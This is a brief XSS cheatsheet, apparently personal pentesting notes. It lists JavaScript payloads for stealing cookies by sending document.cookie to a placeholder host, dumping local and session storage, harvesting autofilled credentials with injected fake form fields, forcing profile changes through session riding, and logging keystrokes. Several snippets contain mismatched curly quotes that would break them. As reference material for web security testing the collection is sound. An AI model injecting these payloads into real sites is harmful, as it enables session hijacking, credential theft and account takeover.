---
tags:
  - xss
  - cheatsheet
---

# XSS Cheatsheet

## Building Requests

```js title="XMLHTTP Request"
let xhr = new XMLHttpRequest()
xhr.open('GET','http://localhost/endpoint',true)
xhr.send('email=update@email.com’)
```

```js title="Fetch API"
fetch('http://localhost/endpoint’)
```

## Stealing Cookies

```js title="Using img src"
<img src="http://localhost?c='+document.cookie+'" />
```

```js title="Using the Fetch API"
fetch("http://localhost?c=" + document.cookie);
```

## Accessing Local & Session Storage

```js title="Local storage"
let localStorageData = JSON.stringify(localStorage);
```

```js title="Session storage"
let sessionStorageData = JSON.stringify(sessionStorage);
```

## Saved Credentials

```js title="Saved creds"
// create the input elements

let usernameField = document.createElement("input");
usernameField.type = "text";
usernameField.name = "username";
usernameField.id = "username";
let passwordField = document.createElement("input");
passwordField.type = "password";
passwordField.name = "password";
passwordField.id = "password";

// append the elements to the body of the page
document.body.appendChild(usernameField);
document.body.appendChild(passwordField);

// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)
setTimeout(function () {
  console.log("Username:", document.getElementById("username").value);
  console.log("Password:", document.getElementById("password").value);
}, 1000);
```

## Session Riding

```js title="Session riding"
let xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost/updateprofile',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('email=updated@email.com’);
```

## Keylogging

```js title="JS Keylogger"
document.onkeypress = function (e) {
  get = window.event ? event : e;

  key = get.keyCode ? get.keyCode : get.charCode;

  key = String.fromCharCode(key);

  console.log(key);
};
```
